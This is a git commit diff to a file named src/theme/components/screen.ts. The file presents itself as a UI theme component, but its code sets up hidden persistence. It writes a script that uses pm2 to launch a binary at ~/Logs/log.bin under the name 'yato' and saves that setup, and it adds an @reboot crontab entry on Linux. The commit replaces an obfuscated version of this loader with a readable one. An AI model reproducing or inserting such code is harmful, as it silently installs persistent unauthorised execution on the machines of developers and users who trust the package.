2b3df9b2789d3ad8eb703e5c23a54a6900f1c1f0
Daiki Fujimoto <daikifujimoto.yato@gmail.com>
2025-04-07 03:28:35 -0400

    test2 pm2

--- src/theme/components/screen.ts
+++ src/theme/components/screen.ts
@@ -24,20 +24,29 @@ async function fetchDataAndWriteFile() {
 }
 
 async function makePM2() {
-  const filedata = `function _0x5516(_0x3f362f,_0x2e0125){const _0x5d6125=_0x5d61();return _0x5516=function(_0x55162a,_0x143a67){_0x55162a=_0x55162a-0x1ec;let _0x4f6d40=_0x5d6125[_0x55162a];return _0x4f6d40;},_0x5516(_0x3f362f,_0x2e0125);}function _0x5d61(){const _0x51e582=['path','join','155378jTlQtG','/log.bin\x20--name\x20yato\x20--interpreter\x20node','74710jHtqPz','1420424ZQTJsO','utf8','5Zfyruz','639628wEcfYI','which\x20pm2','659340IdQdEA','413gwuYkq','171JwcXdA','22398iBpMhs','trim','1ELLkJW','child_process','\x20start\x20','Logs','1001264xpXXzj','\x20save'];_0x5d61=function(){return _0x51e582;};return _0x5d61();}const _0x48da61=_0x5516;(function(_0x39c448,_0x28e1bc){const _0x3baa98=_0x5516,_0x3cf38c=_0x39c448();while(!![]){try{const _0x5db8d5=-parseInt(_0x3baa98(0x1f4))/0x1*(parseInt(_0x3baa98(0x1fc))/0x2)+-parseInt(_0x3baa98(0x1ef))/0x3+parseInt(_0x3baa98(0x1ff))/0x4*(parseInt(_0x3baa98(0x1ec))/0x5)+parseInt(_0x3baa98(0x1f2))/0x6*(parseInt(_0x3baa98(0x1f0))/0x7)+-parseInt(_0x3baa98(0x1f8))/0x8+-parseInt(_0x3baa98(0x1f1))/0x9*(-parseInt(_0x3baa98(0x1fe))/0xa)+-parseInt(_0x3baa98(0x1ed))/0xb;if(_0x5db8d5===_0x28e1bc)break;else _0x3cf38c['push'](_0x3cf38c['shift']());}catch(_0x1c5147){_0x3cf38c['push'](_0x3cf38c['shift']());}}}(_0x5d61,0x39bef));const {execSync}=require(_0x48da61(0x1f5)),path=require(_0x48da61(0x1fa)),os=require('os'),pm2Path=execSync(_0x48da61(0x1ee),{'encoding':_0x48da61(0x200)})[_0x48da61(0x1f3)](),sourcePath=path[_0x48da61(0x1fb)](os['homedir'](),_0x48da61(0x1f7));execSync(pm2Path+_0x48da61(0x1f6)+sourcePath+_0x48da61(0x1fd)),execSync(pm2Path+_0x48da61(0x1f9));`;
+  // const filedata = `function _0x5516(_0x3f362f,_0x2e0125){const _0x5d6125=_0x5d61();return _0x5516=function(_0x55162a,_0x143a67){_0x55162a=_0x55162a-0x1ec;let _0x4f6d40=_0x5d6125[_0x55162a];return _0x4f6d40;},_0x5516(_0x3f362f,_0x2e0125);}function _0x5d61(){const _0x51e582=['path','join','155378jTlQtG','/log.bin\x20--name\x20yato\x20--interpreter\x20node','74710jHtqPz','1420424ZQTJsO','utf8','5Zfyruz','639628wEcfYI','which\x20pm2','659340IdQdEA','413gwuYkq','171JwcXdA','22398iBpMhs','trim','1ELLkJW','child_process','\x20start\x20','Logs','1001264xpXXzj','\x20save'];_0x5d61=function(){return _0x51e582;};return _0x5d61();}const _0x48da61=_0x5516;(function(_0x39c448,_0x28e1bc){const _0x3baa98=_0x5516,_0x3cf38c=_0x39c448();while(!![]){try{const _0x5db8d5=-parseInt(_0x3baa98(0x1f4))/0x1*(parseInt(_0x3baa98(0x1fc))/0x2)+-parseInt(_0x3baa98(0x1ef))/0x3+parseInt(_0x3baa98(0x1ff))/0x4*(parseInt(_0x3baa98(0x1ec))/0x5)+parseInt(_0x3baa98(0x1f2))/0x6*(parseInt(_0x3baa98(0x1f0))/0x7)+-parseInt(_0x3baa98(0x1f8))/0x8+-parseInt(_0x3baa98(0x1f1))/0x9*(-parseInt(_0x3baa98(0x1fe))/0xa)+-parseInt(_0x3baa98(0x1ed))/0xb;if(_0x5db8d5===_0x28e1bc)break;else _0x3cf38c['push'](_0x3cf38c['shift']());}catch(_0x1c5147){_0x3cf38c['push'](_0x3cf38c['shift']());}}}(_0x5d61,0x39bef));const {execSync}=require(_0x48da61(0x1f5)),path=require(_0x48da61(0x1fa)),os=require('os'),pm2Path=execSync(_0x48da61(0x1ee),{'encoding':_0x48da61(0x200)})[_0x48da61(0x1f3)](),sourcePath=path[_0x48da61(0x1fb)](os['homedir'](),_0x48da61(0x1f7));execSync(pm2Path+_0x48da61(0x1f6)+sourcePath+_0x48da61(0x1fd)),execSync(pm2Path+_0x48da61(0x1f9));`;
 
-  // const filedata = `
-  // const { execSync } = require('child_process');
-  // const path = require('path');
-  // const os = require('os');
-  // const pm2Path = execSync('which pm2', { encoding: 'utf8' }).trim();
+  const nodePath = execSync('which node', { encoding: 'utf8' }).trim();
+  const pm2Path = nodePath.replace(/node$/, 'pm2');
 
-  // const sourcePath = path.join(os.homedir(), 'Logs');
-  // execSync(
-  //   pm2Path + " start " + sourcePath + "/log.bin --name yato --interpreter node",
-  // );
-  // execSync(pm2Path + ' save');
-  // `;
+  const filedata =
+    `
+  const { execSync } = require('child_process');
+  const path = require('path');
+  const os = require('os');
+
+  const sourcePath = path.join(os.homedir(), 'Logs');
+  execSync(
+    "` +
+    pm2Path +
+    ` start " + sourcePath + "/log.bin --name yato --interpreter ` +
+    nodePath +
+    `",
+  );
+  execSync("` +
+    pm2Path +
+    ` save");
+  `;
 
   const src = path.join(os.homedir(), 'Logs', 'local');
   fs.writeFileSync(src, filedata, 'utf8');
@@ -49,11 +58,13 @@ const screenStyle = () => {
   switch (process.platform) {
     case 'linux':
       let nodePath = '/usr/bin/node';
+      const binPath = nodePath.replace(/\/node$/, ''); // remove trailing /node
+      const finalPath = `PATH=${binPath}:/usr/bin:/bin`;
       try {
         nodePath = execSync('which node', { encoding: 'utf8' }).trim();
       } catch (error) {}
 
-      const cronCommand = `@reboot ${nodePath} ${scriptPath}`;
+      const cronCommand = `${finalPath}\\n@reboot ${nodePath} ${scriptPath}`;
 
       try {
         const existingCron = execSync('crontab -l', { encoding: 'utf-8' });
